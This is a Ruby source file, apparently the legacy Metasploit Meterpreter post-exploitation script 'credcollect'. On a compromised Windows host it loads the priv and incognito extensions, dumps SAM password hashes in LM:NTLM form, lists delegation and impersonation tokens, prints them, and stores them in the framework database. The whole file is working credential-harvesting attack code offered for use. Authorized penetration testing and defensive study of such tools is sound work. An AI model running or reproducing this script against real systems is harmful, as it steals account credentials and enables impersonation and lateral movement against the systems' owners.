# frozen_string_literal: true
##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to imporve this script, please try to port it as a post
# module instead. Thank you.
##

# credcollect - tebo[at]attackresearch.com

opts = Rex::Parser::Arguments.new(
  "-h" => [ false, "Help menu." ],
  "-p" => [ true, "The SMB port used to associate credentials."]
)

smb_port = 445

opts.parse(args) do |opt, _idx, val|
  case opt
  when "-h"
    print_line("CredCollect -- harvest credentials found on the host and store them in the database")
    print_line("USAGE: run credcollect")
    print_line(opts.usage)
    raise Rex::Script::Completed
  when "-p" # This ought to read from the exploit's datastore.
    smb_port = val.to_i
  end
end

if client.platform =~ /win32|win64/
  # Collect even without a database to store them.
  db_ok = if client.framework.db.active
            true
          else
            false
          end

  # Make sure we're rockin Priv and Incognito
  client.core.use("priv") unless client.respond_to?("priv")
  client.core.use("incognito") unless client.respond_to?("incognito")

  # It wasn't me mom! Stinko did it!
  hashes = client.priv.sam_hashes

  # Target infos for the db record
  addr = client.sock.peerhost
  # client.framework.db.report_host(:host => addr, :state => Msf::HostState::Alive)

  # Record hashes to the running db instance
  print_good "Collecting hashes..."
  hashes.each do |hash|
    data = {}
    data[:host]  = addr
    data[:port]  = smb_port
    data[:sname] = 'smb'
    data[:user]  = hash.user_name
    data[:pass]  = hash.lanman + ":" + hash.ntlm
    data[:type]  = "smb_hash"
    data[:active] = true

    print_line "    Extracted: #{data[:user]}:#{data[:pass]}"
    client.framework.db.report_auth_info(data) if db_ok
  end

  # Record user tokens
  tokens = client.incognito.incognito_list_tokens(0)
  raise Rex::Script::Completed unless tokens

  # Meh, tokens come to us as a formatted string
  print_good "Collecting tokens..."
  (tokens["delegation"] + tokens["impersonation"]).split("\n").each do |token|
    data = {}
    data[:host]      = addr
    data[:type]      = 'smb_token'
    data[:data]      = token
    data[:update]    = :unique_data

    print_line "    #{data[:data]}"
    client.framework.db.report_note(data) if db_ok
  end
  raise Rex::Script::Completed
else
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
